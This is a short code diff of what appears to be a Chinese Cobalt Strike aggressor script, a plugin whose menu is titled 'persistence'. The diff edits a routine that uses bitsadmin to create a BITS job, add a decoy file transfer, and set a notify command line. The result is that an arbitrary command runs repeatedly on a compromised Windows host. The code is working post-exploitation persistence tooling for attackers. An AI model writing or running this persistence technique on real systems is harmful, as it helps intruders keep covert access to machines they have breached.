@@ -15,7 +15,6 @@ menu "☆ 权限维持"{
 			}
 		}
 
-
 		menu "文件控制"{  
 			item "文件属性" {
 				local('$bid');
@@ -2037,7 +2036,7 @@ menu "☆ 权限维持"{
 			$CmdLine =  $3['CmdLine'];
 			blog($bid, "Bitsadmin Jobs Name: \"$JobName\"");
 			brun($bid, "bitsadmin /rawreturn /create $JobName");
-			brun($bid, "bitsadmin /rawreturn /addfile $JobName C:\\Windows\\System32\\user32.dll C:\\Users\\Public\\Documents\\user32.gif");
+			brun($bid, "bitsadmin /rawreturn /addfile $JobName C:\\Windows\\System32\\user32.dll C:\\Windows\\Temp\\Documents\\user32.gif");
 			brun($bid, "bitsadmin /rawreturn /setnotifycmdline $JobName $CmdLine");
 			brun($bid, "bitsadmin /rawreturn /setpriority $JobName high"); # 设置指定作业的优先级。 FOREGROUND HIGH NORMAL LOW
 			brun($bid, "bitsadmin /rawreturn /resume $JobName");
